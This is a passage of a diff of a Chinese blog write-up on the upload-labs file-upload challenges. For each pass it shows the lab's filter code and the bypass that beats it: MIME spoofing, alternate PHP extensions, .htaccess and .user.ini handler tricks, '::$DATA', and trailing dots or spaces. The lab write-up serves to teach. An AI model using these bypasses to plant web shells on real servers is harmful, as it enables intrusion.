@@ -80,7 +80,7 @@
         <p>剑未配妥出门已是江湖，千帆过尽归来仍是少年。</p>
         <div class="top-social_v2">
           <li id="bg-pre">
-            <img class="flipx" src="/img/other/next-b.svg">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/other/next-b.svg">
           </li>
           
             
@@ -121,7 +121,7 @@
             
           
           <li id="bg-next">
-            <img src="/img/other/next-b.svg">
+            <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/other/next-b.svg">
           </li>
         </div>
       </div>
@@ -195,9 +195,9 @@
                   <ul class="sub-menu">
                     
                       <li>
-                        <a href="/categories/技术/">
+                        <a href="/categories/ctf/">
                           <i class="fa fa-code" aria-hidden="true"></i>
-                          技术
+                          ctf
                         </a>
                       </li>
                     
@@ -297,182 +297,58 @@
         
         <div class="entry-content">
           <h1 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h1><p>前端js过滤</p>
-<pre><code class="javascript">function checkFile() {
-    var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;
-    if (file == null || file == &quot;&quot;) {
-        alert(&quot;请选择要上传的文件!&quot;);
-        return false;
-    }
-    //定义允许上传的文件类型
-    var allow_ext = &quot;.jpg|.png|.gif&quot;;
-    //提取上传文件的类型
-    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));
-    //判断上传文件类型是否允许上传
-    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) {
-        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
-        alert(errMsg);
-        return false;
-    }
-}
-</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>最简单的</p>
 <p>burp抓包改后缀</p>
-<h1 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h1><pre><code class="php">$is_upload = false;
-$msg = null;
-if (isset($_POST[&#39;submit&#39;])) {
-    if (file_exists(UPLOAD_PATH)) {
-        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) {
-            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-            $img_path = UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]            
-            if (move_uploaded_file($temp_file, $img_path)) {
-                $is_upload = true;
-            } else {
-                $msg = &#39;上传出错！&#39;;
-            }
-        } else {
-            $msg = &#39;文件类型不正确，请重新上传！&#39;;
-        }
-    } else {
-        $msg = UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;;
-    }
-}
-</code></pre>
+<h1 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>用if函数结合<code>$_FILES[&#39;myfile&#39;][&#39;type&#39;]</code>判断MIME类型</p>
 <p>后端改content-type</p>
 <p>将<code>application/octect-stream</code>变为<code>image/jpeg、image/png或image/gif</code></p>
-<h1 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h1><pre><code class="php">$is_upload = false;
-$msg = null;
-if (isset($_POST[&#39;submit&#39;])) {
-    if (file_exists(UPLOAD_PATH)) {
-        $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);
-        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
-        $file_name = deldot($file_name);//删除文件名末尾的点
-        $file_ext = strrchr($file_name, &#39;.&#39;);
-        $file_ext = strtolower($file_ext); //转换为小写
-        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
-        $file_ext = trim($file_ext); //收尾去空
-
-        if(!in_array($file_ext, $deny_ext)) {
-            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            
-            if (move_uploaded_file($temp_file,$img_path)) {
-                 $is_upload = true;
-            } else {
-                $msg = &#39;上传出错！&#39;;
-            }
-        } else {
-            $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;
-        }
-    } else {
-        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
-    }
-}
-</code></pre>
+<h1 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>他经过了许多步</p>
 <p>但其实他只匹配了<code>$deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</code></p>
 <p>修改为php1，php2，php3，php4，php5，phtml等    与php解析相同的后缀皆可</p>
-<h1 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h1><pre><code class="php">$is_upload = false;
-$msg = null;
-if (isset($_POST[&#39;submit&#39;])) {
-    if (file_exists(UPLOAD_PATH)) {
-        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);
-        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
-        $file_name = deldot($file_name);//删除文件名末尾的点
-        $file_ext = strrchr($file_name, &#39;.&#39;);
-        $file_ext = strtolower($file_ext); //转换为小写
-        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
-        $file_ext = trim($file_ext); //收尾去空
-
-        if (!in_array($file_ext, $deny_ext)) {
-            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;
-            if (move_uploaded_file($temp_file, $img_path)) {
-                $is_upload = true;
-            } else {
-                $msg = &#39;上传出错！&#39;;
-            }
-        } else {
-            $msg = &#39;此文件不允许上传!&#39;;
-        }
-    } else {
-        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
-    }
-}
-</code></pre>
+<h1 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".ini"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这回匹配的倒挺多</p>
 <p>不过配置文件没过滤</p>
 <p>上传.htaccess文件</p>
 <p>写入下面两句中的一句即可</p>
 <p>第一句是全按php解析</p>
 <p>第二句是将jpg按php解析</p>
-<pre><code class="htaccess">SetHandler application/x-httpd-php
-AddType application/x-https-php .jpg
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">AddType application/x-https-php .jpg</span><br></pre></td></tr></table></figure>
 <h1 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h1><p>和第4关类似</p>
 <p>写入.user.ini文件</p>
-<pre><code class="ini">auto_prepend_file=shell.jpg
-</code></pre>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=shell.jpg</span><br></pre></td></tr></table></figure>
 <p>再配合shell</p>
 <h1 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h1><p>这一关源码补上了之前漏网的配置文件</p>
 <p>但是这里可以使用大小写绕过</p>
 <p>例如.Php</p>
 <h1 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h1><p>这里补了一句</p>
-<pre><code class="php"> $file_ext = strtolower($file_ext); //转换为小写
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure>
 <p>没法大小写绕过了</p>
 <p>这里通过补空格来绕过</p>
 <p><code>.php (空格)</code></p>
 <h1 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h1><p>这里补了句首位去空</p>
-<pre><code class="php">$file_ext = trim($file_ext); //首尾去空
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>
 <p>这次用 . 绕过</p>
 <p><code>.php.</code></p>
 <p>和上面一样</p>
 <p>后面的空格和 . 会被服务器自动删除</p>
 <h1 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h1><p>这里补了</p>
-<pre><code class="php">$file_name = deldot($file_name);//删除文件名末尾的点
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure>
 <p>比之前少了一句</p>
-<pre><code class="php">$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure>
 <p>使用</p>
-<pre><code class="shell">.php::$DATA
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php::$DATA</span><br></pre></td></tr></table></figure>
 <h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><p>这里补回了::$DATA仔细看这里过滤的顺序</p>
-<pre><code class="php">$deny_ext=array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
-$file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
-$file_name = deldot($file_name);//删除文件名末尾的点
-$file_ext = strrchr($file_name, &#39;.&#39;);
-$file_ext = strtolower($file_ext); //转换为小写
-$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
-$file_ext = trim($file_ext); //首尾去空
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext=<span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>,<span class="string">".ini"</span>);</span><br><span class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>
 <p>仔细看这里过滤的顺序</p>
 <p>先去的点然后去的空</p>
 <p>于是可以</p>
 <p><code>.php. .</code></p>
 <p>过滤后剩下</p>
 <p><code>.php.</code></p>
-<h1 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h1><pre><code class="php">$is_upload = false;
-$msg = null;
-if (isset($_POST[&#39;submit&#39;])) {
-    if (file_exists(UPLOAD_PATH)) {
-        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;);
-
-        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
-        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
-        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-        $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;        
-        if (move_uploaded_file($temp_file, $img_path)) {
-            $is_upload = true;
-        } else {
-            $msg = &#39;上传出错！&#39;;
-        }
-    } else {
-        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
-    }
-}
-</code></pre>
+<h1 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>,<span 